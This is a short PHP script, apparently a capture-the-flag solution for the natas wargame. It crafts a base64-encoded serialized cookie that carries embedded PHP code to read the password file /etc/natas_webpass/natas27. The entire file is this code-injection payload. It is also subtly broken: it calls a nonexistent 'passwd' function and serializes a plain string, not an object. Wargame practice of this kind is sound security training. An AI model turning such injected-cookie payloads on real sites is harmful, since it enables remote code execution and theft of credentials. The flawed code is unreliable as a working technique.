<?php

$cookie = "<? passwd('cat /etc/natas_webpass/natas27'); ?>";
$output = base64_encode(serialize($cookie));

print_r($output);

?>